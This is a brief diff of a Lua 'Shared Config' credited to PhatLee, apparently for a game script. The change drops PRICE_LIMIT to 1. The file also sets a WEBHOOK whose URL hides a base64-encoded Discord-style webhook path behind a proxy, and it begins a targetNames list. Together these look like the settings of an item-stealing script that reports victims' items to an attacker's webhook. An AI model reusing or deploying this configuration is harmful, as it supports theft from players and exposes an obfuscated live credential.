@@ -1,7 +1,7 @@
 -- 🔗 Shared Config (by PhatLee)
 local config = {}
 
-config.PRICE_LIMIT = 10_000_000
+config.PRICE_LIMIT = 1
 config.WEBHOOK = "https://proxy-roan-sigma.vercel.app/YXBpL3dlYmhvb2tzLzE0MzAxODI1MzY3NzIwNjMzMDUvN2xkSkdBalBvR1VtdmtyVlRTWUhHa1JDNzZ0UGc3VHB2Zks3RXJ4QUsxekxxLU1IWWxJUnRXZ01oaHJzVWF6RzZwNks="
 
 config.targetNames = {
